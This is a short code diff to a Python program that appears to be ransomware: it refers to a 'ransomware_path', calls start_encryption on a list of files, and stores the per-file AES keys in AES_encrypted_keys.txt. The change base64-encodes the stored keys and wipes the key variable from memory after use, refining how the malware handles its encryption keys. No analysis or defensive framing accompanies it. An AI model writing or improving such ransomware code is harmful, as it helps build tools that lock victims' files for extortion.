@@ -150,10 +150,13 @@ def menu():
     aes_keys_and_base64_path = start_encryption(new_files)
     
     if(aes_keys_and_base64_path != None):
-        with open(ransomware_path + '/AES_encrypted_keys.txt', 'ab') as f:    
+        with open(ransomware_path + '/AES_encrypted_keys.txt', 'a') as f:    
             for _ in aes_keys_and_base64_path:
-                f.write(_[0] + " " + _[1] + "\n")
+                f.write(base64.b64encode(_[0]) + " " + _[1] + "\n")
 
+        aes_keys_and_base64_path = None
+        gc.collect()
+        del aes_keys_and_base64_path
 
 if __name__ == "__main__":
     while True:
